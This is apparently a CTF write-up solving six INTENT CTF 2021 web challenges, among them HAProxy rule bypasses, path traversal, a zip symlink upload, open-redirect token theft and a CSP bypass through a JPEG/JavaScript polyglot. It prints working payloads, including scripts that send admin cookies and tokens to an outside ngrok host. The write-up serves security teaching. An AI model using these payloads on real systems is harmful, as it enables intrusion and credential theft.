# INTENT CTF 2021

![Logo](img/Intent_logo.png)

[INTENT Security Research Summit 2021](https://intentsummit.org/) was founded by security companies CyberArk and Checkmarx and is focused on security research. 

I played (most of) their web challenges and I thought they were simple, but very creative. 

In this write-up, I'll make a fast-pass on the solved challenges, with less details than usual.

![solved-challenges](img/solved-challenges.png)

# Door (un)Locked

![door-unlocked](img/door-unlocked.png)

## Challenge

In this challenge, we are presented with an empty page.

![door-unlocked-page](img/door-unlocked-page.png)

We have an attachment called ```ha.cfg```:

```apache
global
    daemon
defaults  
    mode    http
    timeout  client  50000
    timeout  server  50000
    timeout  connect 50000
frontend web 
    bind *:8000  
    http-request deny if { path_beg /flag }
    http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ }
    default_backend websrvs
backend websrvs 
    http-reuse always
    server srv1 flask:5000
```

While searching a little bit, I confirmed my suspicion that it is an haproxy configuration file. 

We have an haproxy in front of an internal server (flask:5000). There is a /flag endpoint, which is our obvious target, but it is externally blocked by the two **http-request deny**:

1. The first blocks any request starting with **/flag**
2. The second blocks any request that, after urldecoding, matches the regex bellow.

```
^.*/?flag/?.*$
```

Let's take a look:

```
$ curl http://door-unlocked.chal.intentsummit.org:8000/flag
<html><body><h1>403 Forbidden</h1>
Request forbidden by administrative rules.
</body></html>
```

## Hacking

For testing purposes, I started a local haproxy protecting a fake http server (just a netcat), just to test the bypass.

```
$ nc -l -p 5000 < netcat.response.http
```

At first, let's comment the regex line to understand the first protection.

```
http-request deny if { path_beg /flag }
# http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ }
```

Since it protects only the exact /flag string, it's a very easy bypass:

```
$ # Normal block
$ curl http://localhost:8000/flag
<html><body><h1>403 Forbidden</h1>
Request forbidden by administrative rules.
</body></html>
$
$ # Bypass
$ curl --path-as-is http://localhost:8000/./flag
Bypassed!
```

We just changed **/flag** to **/./flag** (shame on you). Note that I used the --path-as-is flag on curl to avoid normalization on the client-side.

Let's invert the the comments to test the regex bypass:

```
# http-request deny if { path_beg /flag }
http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ }
```

You should really take a look at https://regex101.com/, that explains the regex meaning to dumb people like me.

![door-unlocked-regex-explain](img/door-unlocked-regex-explain.png)

At first, it looks like anything with the word "flag" inside the URL would be blocked, even if we send a urlencoded payload, since it decodes before matching. BUT, if you analyze the details of the regex, we can find our vulnerability. regex101 makes it easier:

![door-unlocked-regex-hack](img/door-unlocked-regex-hack.png)

So... what about sending a line terminator?
(Note that I'm keeping the the first bypass in the game)

```
# Normal block
$ curl --path-as-is http://localhost:8000/./flag
<html><body><h1>403 Forbidden</h1>
Request forbidden by administrative rules.
</body></html>
$ 
$ # Bypass
$ curl --path-as-is http://localhost:8000/./%0a/../flag
Bypassed!
```

Pretty nice, it accepted our %0A (ASCII Line Feed) and, since it does not match the "```.*```", it bypassed the regex.

Now, get the flag in the real server:

```
$ curl --path-as-is http://door-unlocked.chal.intentsummit.org:8000/./%0a/../flag
INTENT{Smuggl3_w1th_H4_Pr0xy}
```

Unlocked!

```INTENT{Smuggl3_w1th_H4_Pr0xy}```

# Etulosba

![Etulosba-Description](img/etulosba-description.png)

## Challenge

In this challenge, the main page only shows the word **etulosba**, which is **absolute** reversed, the obvious hint. We also got the simulated CDN source code:

```javascript
const fs = require("fs");
const path = require("path");
const express = require("express");

const server = express();

server.get("/", function (req, res) {
    res.end("<html><body>etulosba</body></html>");
});

server.get("/files/images/:name", function (req, res) {
    if (req.params.name.indexOf(".") === -1) {
        return res.status(400).json({ error: "invalid file name" });
    }

    res.sendFile(__dirname + path.join("/files/images/", req.params.name));
});

server.get("/files/binary/:name", function (req, res) {
    if (req.params.name.indexOf(".") !== -1) {
        return res.status(400).json({ error: "invalid file name" });
    }

    res.sendFile(path.resolve(__dirname, "/files/binary/", req.params.name));
});

fs.writeFileSync(path.join(__dirname, "flag.name"), process.env.FLAG_NAME);
fs.writeFileSync(path.join("/tmp", process.env.FLAG_NAME), process.env.FLAG);

server.listen(process.env.HTTP_PORT);
```

In summary:
* It simulates a simple CDN, which allows you to download binary and image files from specific directories.
* The flag is a file inside **/tmp**, which we don't know the name
* There is a file called **flag.name**, on the app directory.
    * Inside this file is the unknown name of the flag file.

## Hacking

It is pretty clear that we have to get the flag.name file and, using the value, getting the flag file inside tmp.
The obvious flaw of the app is the [LFI - Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion), which I explained in a recent write-up: [ASISCTF 2021 - ASCII art as a service](https://fireshellsecurity.team/asisctf-ascii-art-as-a-service/)

Let's first get the **flag.name** file, using the **/files/images/:name**. Let's try [path traversal](https://owasp.org/www-community/attacks/Path_Traversal) here:

```html
$ curl -k --path-as-is https://etulosba.chal.intentsummit.org/files/images/../../flag.name
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /files/images/../../flag.name</pre>
</body>
</html>
```

This message means the express app does not found any GET route with this pattern. This happens because we broke the pattern **/files/images/:name**. If we just urlencode the :name, it works>

```html
$ curl -k --path-as-is https://etulosba.chal.intentsummit.org/files/images/..%2f..%2fflag.name
imaflagimaflag
```

We got the flag file name: ```imaflagimaflag```. We didn't even got a protection, because it needs a dot (.) in the :name parameter and we already have it.

Now that we know the flag location, let's try to get it with the same route. We don't know the current path, so let's go back a lot with ```../../../../../../../../tmp/imaflagimaflag```.
Because of the nginx in front of the real app, the real error is masked and it is not so clear to explain. I'll test locally directly in the node app to show the real error.

```html
$ curl -k --path-as-is http://localhost:8000/files/images/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fimaflagimaflag
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: ENOENT: no such file or directory, stat &#39;/writeup/etulosba/tmp/imaflagimaflag&#39;</pre>
</body>
</html>
```

```Error: ENOENT: no such file or directory, stat '/writeup/etulosba/tmp/imaflagimaflag'```

It concatenated the current directory because it's using the ```path.join``` method. No lucky here.
What about an ABSOLUTE path? :)

```
$ curl -k --path-as-is https://etulosba.chal.intentsummit.org/files/images/%2ftmp%2fimaflagimaflag
{"error":"invalid file name"}
```

It blocks us because there is no dot in the filename... BUT we also have the ```/files/binary/:name``` endpoint.

```
$ curl -k --path-as-is https://etulosba.chal.intentsummit.org/files/binary/%2ftmp%2fimaflagimaflag
INTENT{absolutely_great_job_with_the_absolute_path}
```

It works now, because there is no dot and the ```path.resolve``` method has the particular behaviour of ignoring the previous parameters if you send an ABSOLUTE path. It's not a concatenation as in the ```path.join``` case.

```INTENT{absolutely_great_job_with_the_absolute_path}```

# Careers

![Logo](img/careers-description.png)

## Challenge

We start with a main page and a ```careers.php``` page.

```Upload your CV using txt format only, please archive the files using zip format```

![Logo](img/careers-page.png)

Let's add our zipped resumee to test it:

```
$ cat resumee-nep1.txt 
Name: nep1

$ cat resumee-nep1.txt 
Name: nep1

$ zip resumee-nep1.zip resumee-nep1.txt
  adding: resumee-nep1.txt (stored 0%)
```

It created a link for me: ```https://careers.chal.intentsummit.org/upload/9b2b4b582c3df097c6c5b3fea68c8d1f```

![Logo](img/careers-upload-1.png)

And clickling the generated link (```https://careers.chal.intentsummit.org/upload/9b2b4b582c3df097c6c5b3fea68c8d1f/resumee-nep1.txt```) I could see the original resumee txt file.

Other findings:
* If I generated a zip with multiple files, it would show them.
* It only showed ```.txt``` files.
* The files with other extensions (like .php) weren't in the directory (acessing directly without the link).

## Hacking

My very first CTF write-up is still one of the most interesting challenges I got. It was on Defenit CTF 2020, called [TAR Analyzer](https://neptunian.medium.com/defenit-ctf-2020-write-up-tar-analyzer-web-hacking-29ed5be3f5f4). It explains, in portuguese, part of the vulnerability here.

Since the careers page need to unzip the file, it opens some vulnerabilities here. In this case, I used the ```ZIP SymLink Vulnerability```. I can just zip a symbolic link. When decompressed, it will keep being a link in the server file system, to whatever file I need.

You can guess some default places for the flag file. And if you look at the first challenge, they're using ```/flag```. In most challenges it is ```/flag.txt```.

So, let's create the payload.

```bash
# create the flag simulated file
$ echo flag{fake} | sudo tee /flag
flag{fake}

neptunian:~/ctf/intent-ctf-2021/web/writeup/careers$ cat /flag
flag{fake}

# create the poisoned symlink
$ ln -s /flag poisoned_symlink.txt

$ cat poisoned_symlink.txt 
flag{fake}

# create the zip with the payload - note the parameter
$ zip --symlinks payload.zip poisoned_symlink.txt 
  adding: poisoned_symlink.txt (stored 0%)
$ unzip -l payload.zip 
Archive:  payload.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        5  2021-11-16 14:15   poisoned_symlink.txt
---------                     -------
        5                     1 file
```

And now, after getting the new ".txt" file link:

```
$ curl -k https://careers.chal.intentsummit.org/upload/1234e827d05414a5c9dd29d30cf145cc/poisoned_symlink.txt
INTENT{zipfiles_are_awsome_for_pt}
```

```INTENT{zipfiles_are_awsome_for_pt}```


# Flag Vault

![flag-vault-description](img/flag-vault-description.png)

## Challenge

In this challenge, we are sent to a ```/admin``` but, because we are not logged, it redirects us to ```/?redirect=/admin&error=INVALID_TOKEN```.

![flag-vault-page](img/flag-vault-page.png)

It has also a ```Report Bug``` functionality, where you can send a URL for analysis.

There is no server-side source code, but the local Javascript in the login page is interesting:

```javascript
const params = new URLSearchParams(window.location.search);
const query = Object.fromEntries(params.entries());
const redirectTo = String(query.redirect || "");

const form = document.querySelector("form");
const email = document.querySelector("input[name=email]");
const password = document.querySelector("input[name=password]");

form.addEventListener("submit", async function (event) {
    event.preventDefault();

    const jsonBody = JSON.stringify({ email: email.value, password: password.value });

    const response = await fetch("/api/v1/login", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: jsonBody
    });

    if (response.status === 401) {
        return alert("Invalid email or password");
    }

    const jsonData = await response.json();
    window.location = location.origin + redirectTo + "?token=" + jsonData.token;
});

function report() {
    const url = prompt("URL", window.location.href);
    fetch("/api/v1/report?url=" + encodeURIComponent(url));
}
```

In summary, it tries to login with user-provided credentials. If the user gets authenticated, it returns a token and redirects us to ```/admin?token=TOKEN_VALUE```.

* Flag is naturally on ```/admin```
* We need the token to get the flag in the way god wanted.

## Hacking

The report URL, as in many other CTFs, is an admin (bot), which checks our URL and will be already logged in the app, with special privileges.

The "intended" behaviour of the app, after receiving the ```redirect``` in the querystring, is to redirect inside the app, by concatenating the app base URL (```location.origin```) before the redirect path.

For our current URL, ```http://flag-vault.chal.intentsummit.org/?redirect=/admin&error=INVALID_TOKEN```, it means:

* location.origin: ```http://flag-vault.chal.intentsummit.org```
* redirect: ```/admin```
* Boring concatenation: ```http://flag-vault.chal.intentsummit.org/admin```

This concatenation is what makes the app ~~in~~-vulnerable.
As thought by the master-hacker [Orange Tsai](https://twitter.com/orange_8361), [URLs are complex](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) :) 

I explain a little bit of it in the writeup [redpwnCTF 2021 - Requester + Requester Strikes Back](https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/).

We can have this (incomplete/simplified) format:
http://user@domain/path?querystring

If we put an "```@```" before the querystring, we can make the admin browser think the ```location.origin``` is an username instead of the domain. 

Let's simulate it, using my ngrok endpoint:

```http://flag-vault.chal.intentsummit.org/?redirect=@c292-201-17-126-102.ngrok.io/admin```

Look what we got:

![flag-vault-page](img/flag-vault-got-token.png)

Let's check our pretty new token:

```text
$ curl -k http://flag-vault.chal.intentsummit.org/admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNjM3MDkwNzQ1LCJleHAiOjE2MzcwOTA3NTV9.an2VDDvxF-glaG0OednzW6vu5daPGNX7Oft_b6TrvPo

Found. Redirecting to /?redirect=/admin&error=TokenExpiredError%3A%20jwt%20expired
```
```TokenExpiredError```

The token expires really fast, so we can't get the flag manually.
Let's create a faster endpoint, which will receive the token and get the flag for us on time.

![flash](img/flash.jpg)

```php
<?php 

$token = $_GET["token"];
$target = "http://flag-vault.chal.intentsummit.org/admin?token=" . $token;
$flag = file_get_contents($target);

file_get_contents("https://c292-201-17-126-102.ngrok.io/flag?" . urlencode($flag));
?>
```

Let it go:

```http://flag-vault.chal.intentsummit.org/?redirect=@c292-201-17-126-102.ngrok.io/flash.php```

And suddenly:

![flash](img/flag-vault-get-flag.png)

```INTENT{danger0us_0pen_red1rect}```

P.S.: for some reason, I couldn't just save the flag locally in the PHP app (missing privileges). It was just faster to make another request.

# Mass Notes

![mass-notes](img/mass-notes.png)

## Challenge

In this challenge, we get a basic notepad app.

![mass-notes-page](img/mass-notes-page.png)

The note is sent encoded in JSON via POST to /note:

```json
{"title":"Note 1","content":"Text 1"}
```

And we receive this JSON object as answer:

```json
{"title":"Note 1","content":"Text 1","avatar":"default_1.png","_id":"6194223d989bedd8dfa702dd","__v":0}
```

And after that, you are redirected to a ```note.html``` page, that receives this exact JSON in the querystring and build the note page.

![mass-notes-filled](img/mass-notes-filled.png)

## Hacking

After looking in some wrong directions, the avatar is something to take a look.

* You receive ```"avatar":"default_1.png"```, but there is no option in the page to set the avatar.
* The link of the avatar is: ```https://mass-notes.chal.intentsummit.org/avatar/619420f1989bedd8dfa702da.png```.
    * The format is: /avatar/ID_RECEIVED.png


But What if we can set the avatar and it is only not in the page?

Let's try it:

```
curl -k 'https://mass-notes.chal.intentsummit.org/note' \
>   -H 'content-type: application/json' \
>   --data-raw '{"title":"Note 1","content":"Text 1","avatar":"neptunian.png"}'

{"title":"Note 1","content":"Text 1","avatar":"neptunian.png","_id":"619425b3989bedd8dfa702e2","__v":0}
```

It worked!

But let's check what happens when we try to get the avatar image with the new ID received (```619425b3989bedd8dfa702e2```):

```
$ curl -k https://mass-notes.chal.intentsummit.org/avatar/619425b3989bedd8dfa702e2.png
Error: ENOENT: no such file or directory, open '/app/avatars/neptunian.png'
```

Yeah! The errors tells us that it is trying to open a file called neptunian.png and didn't found it. We have an LFI!

Let's create another note, pointing our file to the possible flag location. We also know the default path is /app/avatars, so we need to get up two levels in our path traversal.

```
$ curl -k 'https://mass-notes.chal.intentsummit.org/note' \
>   -H 'content-type: application/json' \
>   --data-raw '{"title":"Flag Note","content":"Bleh","avatar":"../../flag"}'
{"title":"Flag Note","content":"Bleh","avatar":"../../flag","_id":"61942783989bedd8dfa702e4","__v":0}
```

Get the bastard, using the new ID:

```
$ curl -k https://mass-notes.chal.intentsummit.org/avatar/61942783989bedd8dfa702e4.png
INTENT{d0nt_mass_with_ap1s}
```

```INTENT{d0nt_mass_with_ap1s}```

Next!

# Darknet Club

![darknet-club-description](img/darknet-club-description.png)

## Challenge

This was, in my shitty opinion, the most creative web challenge in the CTF (but I didn't have time to look at sigNULL).

After registration and login, we go to the profile page.

![darknet-club-page](img/darknet-club-page.png)

* We can change the parameters in our profile.
* The ```Request Invitation``` option takes no parameters and returns nothing. 

## Hacking

Let's assume there is an admin bot who will take a look at our profile after the invitation request is sent.
We need to try a [XSS](https://owasp.org/www-community/attacks/xss/) here.

After changing all fields, we see that the ```Referral``` is not sanitized and, at first, vulnerable to XSS:

Let's try adding a HTML and scripting to it:

```html
<strong>Admin</strong><script>alert(1);</script>
```

The ```Admin``` got bold with the strong tag, but no alert fired. This errors happens in the Javascript side:

```Refused to execute inline script because it violates the following Content Security Policy directive: "default-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-5jFwrAK0UV47oFbVg/iCCBbxD8X1w+QvoOUepu4C2YA='), or a nonce ('nonce-...') is required to enable inline execution. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.```

This happens because the server is sending the following [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) directives in the /profile header:

```yaml
content-security-policy: default-src 'self'; object-src 'none'; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com;
```

The policy contains a ```default-src 'self'```, which means it will only run Javascript from a file inside the same domain (actually, there's many more details to it, but let's keep things simple).

So, to explore this XSS, we need a Javascript on the server-side of the current domain. Which we don't have. And we can't upload. Can't we??

You have an option to upload an avatar, but the server does not allows us to send a JS there.

![darknet-club-page](img/darknet-club-avatar-blocked-js.png)

```This file could not be uploaded, only JPEG files are allowed!```

The file have to be a JPEG for the server to allow it. After playing a bit with it, we see that it just check the file signature. Not even the file extension.

Let's create a fake file, using the signature from some random jpeg.

```
$ dd if=download.jpg bs=1 count=3 of=somefile.js

3+0 records in
3+0 records out
3 bytes copied, 0,000481273 s, 6,2 kB/s

$ hexdump -C somefile.js 

00000000  ff d8 ff                                          |...|
00000003
```

Now you receive an ```Image uploaded successfully!```

We can't just send a random jpeg with in the middle of the text. It wont work.

There is a VERY interesting article, by [Gareth Heyes](https://twitter.com/garethheyes), on [Bypassing CSP using polyglot JPEGs
](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs). 

This is not the article we want, but it is the article we need.

![batman](img/batman.jpg)

This is great but we need only to solve a subset of Gareth's problem. We don't need a full polyglot jpeg but just the first part. It turns out the JPEG signature can be used as a valid variable name in Javascript. We can have a first line like this:

```javascript
jpeg_signature=1;
-- any payload we want!
```

To make it easier, since I was testing some different payloads at the time, I created a small script to assemble the payload.

```python
out = open('jpeg-payload.js', 'wb')
payload = ''

with open('payload.js', 'rb') as file:
    payload = file.read()

# Fake header
out.write(b'\xff\xd8\xff=1;')
out.write(payload)

out.close()
```

For the actual Javascript payload. I tried to first make a fetch my URL with the admin cookie, but fetching other domain is blocked by CSP. We can bypass it by redirecting the browser page to our domain.

```javascript
window.location.href = 'http://66e9-201-17-126-102.ngrok.io/flag?'+encodeURIComponent(document.cookie);
```

Let's generate our payload and upload it.

```
$ python inject.py 
neptunian:~/ctf/intent-ctf-2021/web/writeup/darknet-club$ hexdump -C jpeg-payload.js 
00000000  ff d8 ff 3d 31 3b 77 69  6e 64 6f 77 2e 6c 6f 63  |...=1;window.loc|
00000010  61 74 69 6f 6e 2e 68 72  65 66 20 3d 20 27 68 74  |ation.href = 'ht|
00000020  74 70 3a 2f 2f 36 36 65  39 2d 32 30 31 2d 31 37  |tp://66e9-201-17|
00000030  2d 31 32 36 2d 31 30 32  2e 6e 67 72 6f 6b 2e 69  |-126-102.ngrok.i|
00000040  6f 2f 66 6c 61 67 3f 27  2b 65 6e 63 6f 64 65 55  |o/flag?'+encodeU|
00000050  52 49 43 6f 6d 70 6f 6e  65 6e 74 28 64 6f 63 75  |RIComponent(docu|
00000060  6d 65 6e 74 2e 63 6f 6f  6b 69 65 29 3b           |ment.cookie);|
0000006d
$
```

```Image uploaded successfully!```

Let's try getting the image from the avatar URL ```https://darknet-club.chal.intentsummit.org/api/avatar/nep3```

```
$ curl -k https://darknet-club.chal.intentsummit.org/api/avatar/nep3 | hexdump -C

00000000  ff d8 ff 3d 31 3b 77 69  6e 64 6f 77 2e 6c 6f 63  |...=1;window.loc|
00000010  61 74 69 6f 6e 2e 68 72  65 66 20 3d 20 27 68 74  |ation.href = 'ht|
00000020  74 70 3a 2f 2f 36 36 65  39 2d 32 30 31 2d 31 37  |tp://66e9-201-17|
00000030  2d 31 32 36 2d 31 30 32  2e 6e 67 72 6f 6b 2e 69  |-126-102.ngrok.i|
00000040  6f 2f 66 6c 61 67 3f 27  2b 65 6e 63 6f 64 65 55  |o/flag?'+encodeU|
00000050  52 49 43 6f 6d 70 6f 6e  65 6e 74 28 64 6f 63 75  |RIComponent(docu|
00000060  6d 65 6e 74 2e 63 6f 6f  6b 69 65 29 3b           |ment.cookie);|
0000006d
```

It's our payload. Now, let's change the referral to call our javascript:

```html
<strong>Admin</strong><script charset="ISO-8859-1"  type="text/javascript" src="/api/avatar/nep3"></script>
```

After saving, it immediatelly redirects us to our ngrok.

![darknet-club-redirected](img/darknet-club-redirected.png)

The cookie is ours (if you're brazilian, please avoid daddy jokes by not translating it):

![darknet-club-cookie-received](img/darknet-club-cookie-received.png)

So now, we have to (FINALLY) ask for the admin to check our profile. Since our profile now ALWAYS redirects us very fast, let's just send it with curl (please, no 5th grade brazilian jokes here!).

```text
curl -k -v -X POST 'https://darknet-club.chal.intentsummit.org/api/report' \
  -H 'session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5lcDMiLCJpYXQiOjE2MzcxMDAwMjV9.ERu4iZCxE6DyqBe3qmX00WGiux--ikLQBiLbxmeSN3s'
```

![darknet-club-got-flag](img/darknet-club-got-flag.png)

```INTENT{a_jp36_1s_w0r7h_a_7h0u54nd_w0rd5}```

# References

* INTENT CTF 2021: https://ctf.intentsummit.org/
* CTF Time Event: https://ctftime.org/event/1454
* INTENT Cybersecurity Summit 2021: https://intentsummit.org/
* ASISCTF 2021 - ASCII art as a service: https://fireshellsecurity.team/asisctf-ascii-art-as-a-service/
* Defenit CTF 2020 - TAR Analyzer: https://neptunian.medium.com/defenit-ctf-2020-write-up-tar-analyzer-web-hacking-29ed5be3f5f4
* [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/)
* OWASP - Cross Site Scripting (XSS): https://owasp.org/www-community/attacks/xss/
* Content Security Policy (CSP): https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
* Repo with the artifacts discussed here: https://github.com/Neptunians/intent-ctf-2021-writeup
* Team: [FireShell](https://fireshellsecurity.team/)
* Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
* Follow me too :) [@NeptunianHacks](twitter.com/NeptunianHacks)